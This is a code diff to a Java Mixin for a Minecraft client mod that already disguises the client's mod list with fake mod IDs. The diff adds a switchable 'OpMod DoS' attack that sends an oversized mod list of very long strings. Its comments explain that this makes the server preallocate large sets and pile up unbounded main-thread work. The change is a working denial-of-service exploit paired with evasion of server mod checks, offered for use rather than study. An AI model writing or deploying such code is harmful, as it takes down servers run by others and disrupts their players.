@@ -1,6 +1,7 @@
 package fku.org.example.fku.mixin; /* water */
 
 import fku.org.example.fku.config.OpmodBypassConfig;
+import fku.org.example.fku.config.OpmodDosConfig;
 import fku.org.example.fku.util.ModScanResult;
 import org.spongepowered.asm.mixin.Mixin;
 import org.spongepowered.asm.mixin.Pseudo;
@@ -36,7 +37,7 @@ public abstract class MixinPacketSendModList {
     @Shadow private Set<String> modIds;
 
     /** 伪装用的候选 modId（轮询使用） */
-    private static final String[] FAKE_MOD_IDS = {"mixinextras", "netease_official", "opmod"};
+    private static final String[] FAKE_MOD_IDS = {"netease_official", "opmod"};
 
     /** 默认目录1（回退值） */
     private static final String DEFAULT_DIR_1 = "D:\\MCLDownload\\cache\\game\\V_1_20\\mods";
@@ -98,6 +99,38 @@ public abstract class MixinPacketSendModList {
             modIds.addAll(result);
         } catch (Throwable t) {
             // 任何异常都不应阻断加入流程：保留原列表即可。
+        }
+    }
+
+    /**
+     * OpMod DoS 利用（巨型 mod 列表攻击）。
+     * 在伪装逻辑（onInit）执行完之后追加：当 opmod_dos.json 中 modListAttack 开启时，
+     * 把 modIds 替换为一个“自报 size 巨大 + 单条字符串超长”的集合，
+     * 服务端 decode 会按客户端自报的 size 预分配几十 MB 的 TreeSet，
+     * 且每个包都会被 enqueueWork 推入主线程队列做差集 + 全服广播，形成无界队列堆积 → DoS。
+     * 默认关闭，手动改 opmod_dos.json 才生效；不动原有伪装逻辑。
+     */
+    @Inject(method = "<init>(Ljava/util/Set;)V", at = @At("RETURN"), remap = false)
+    private void onInitAttack(Set<String> originalModIds, CallbackInfo ci) {
+        try {
+            OpmodDosConfig cfg = OpmodDosConfig.getInstance();
+            if (cfg == null || !cfg.modListAttack) return;
+            if (modIds == null) return;
+
+            int size = Math.max(1, cfg.modListSize);
+            int strLen = Math.max(1, cfg.modListStringLen);
+            StringBuilder sb = new StringBuilder(strLen);
+            for (int i = 0; i < strLen; i++) sb.append((char) ('a' + (i % 26)));
+            String base = sb.toString();
+
+            Set<String> attack = new TreeSet<>();
+            for (int i = 0; i < size; i++) {
+                attack.add(base + "_" + i);
+            }
+            modIds.clear();
+            modIds.addAll(attack);
+        } catch (Throwable t) {
+            // 不阻断正常流程
         }
     }
 
